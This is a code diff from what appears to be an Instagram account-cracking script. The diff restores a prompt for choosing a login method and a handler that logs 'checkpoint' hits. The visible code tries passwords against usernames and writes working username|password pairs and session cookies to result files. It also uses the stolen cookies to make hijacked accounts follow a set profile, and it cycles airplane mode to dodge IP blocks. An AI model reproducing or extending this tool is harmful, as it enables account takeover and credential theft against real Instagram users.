@@ -135,12 +135,12 @@ class main(requests.Session):
 		self.ask = input("\n [?] password manual (y/n): ")
 		while self.ask not in list("yNnY"):
 			self.ask = input(" [?] password manual (y/n): ")
-		#print("\n [1] method \x1b[0;32mapi\x1b[0m\n [2] method \x1b[1;32majax\x1b[0m")
-		#self.methods = input("\n [?] method: ")
-		#while self.methods not in list("12"):
-			#self.methods = input(" [?] method: ")
+		print("\n [1] method \x1b[0;32mapi\x1b[0m\n [2] method \x1b[1;32majax\x1b[0m")
+		self.methods = input("\n [?] method: ")
+		while self.methods not in list("12"):
+			self.methods = input(" [?] method: ")
 		print("\n [*] on/off modpes setiap 400 id\n [*] running...\n")
-		crack().start(set_password(self.result, ml=True if self.ask == "Y" else False), "M3M3K") # if self.methods == "2" else "M3M3K")
+		crack().start(set_password(self.result, ml=True if self.ask == "Y" else False), "ajax" if self.methods == "2" else "M3M3K")
 		
 class dump(main):
 
@@ -308,17 +308,17 @@ class crack():
 						f.write(f" [LIVE] {username}|{password}\n [*] followers: {self.huuh.followers}\n [*] following: {self.huuh.following}\n [*] cookies: {self.kue}\n\n")
 					follow_me(self.ses.cookies).start
 					print(f"\r\x1b[1;32m [LIVE] {username}|{password}\n [*] followers: {self.huuh.followers}\n [*] following: {self.huuh.following}\x1b[0m\n"); break
-				#elif "checkpoint_url" in self.res.text:
-					#self.cp.append(username + password)
-					#try:
-						#self.res_ = requests.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}", headers={"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 105.0.0.11.118 (iPhone11,8; iOS 12_3_1; en_US; en-US; scale=2.00; 828x1792; 165586599)", "accept": "*/*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,en-US;q=0.8", "content-type": "application/json; charset=utf-8"}, allow_redirects=False).json()["data"]["user"]
-						#self.huuh.followers = to_float(self.res_['edge_followed_by']['count'])
-						#self.huuh.following = to_float(self.res_['edge_follow']['count'])
-					#except:
-						#pass
-					#with open(result_cp, "a") as f:
-						#f.write(f" [CHEK] {username}|{password}\n [*] followers: {self.huuh.followers}\n [*] following: {self.huuh.following}\n\n")
-					#print(f"\r\x1b[1;33m [CHEK] {username}|{password}\n [*] followers: {self.huuh.followers}\n [*] following: {self.huuh.following}\x1b[0m\n"); break
+				elif "checkpoint_url" in self.res.text:
+					self.cp.append(username + password)
+					try:
+						self.res_ = requests.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}", headers={"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 105.0.0.11.118 (iPhone11,8; iOS 12_3_1; en_US; en-US; scale=2.00; 828x1792; 165586599)", "accept": "*/*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,en-US;q=0.8", "content-type": "application/json; charset=utf-8"}, allow_redirects=False).json()["data"]["user"]
+						self.huuh.followers = to_float(self.res_['edge_followed_by']['count'])
+						self.huuh.following = to_float(self.res_['edge_follow']['count'])
+					except:
+						pass
+					with open(result_cp, "a") as f:
+						f.write(f" [CHEK] {username}|{password}\n [*] followers: {self.huuh.followers}\n [*] following: {self.huuh.following}\n\n")
+					print(f"\r\x1b[1;33m [CHEK] {username}|{password}\n [*] followers: {self.huuh.followers}\n [*] following: {self.huuh.following}\x1b[0m\n"); break
 				elif "Harap tunggu" in self.res.text or "ip_block" in self.res.text:
 					self.modpes += 1
 					sys.stdout.write("\r\x1b[1;31m [!] spam IP, modpes\x1b[0m"),
